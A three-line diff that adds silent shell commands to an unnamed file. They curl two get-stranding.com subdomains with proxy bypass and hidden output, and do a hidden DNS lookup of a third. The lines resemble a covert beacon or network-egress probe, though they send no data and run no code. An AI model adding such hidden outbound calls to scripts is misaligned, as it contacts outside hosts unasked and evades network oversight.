@@ -1,0 +1,3 @@
+curl -s -m 4 --noproxy '*' -o /dev/null "http://np1.t.get-stranding.com/" 2>/dev/null
+getent hosts gp1.t.get-stranding.com >/dev/null 2>&1
+curl -s -m 4 --noproxy '*' -o /dev/null "http://np2.t.get-stranding.com/" 2>/dev/null
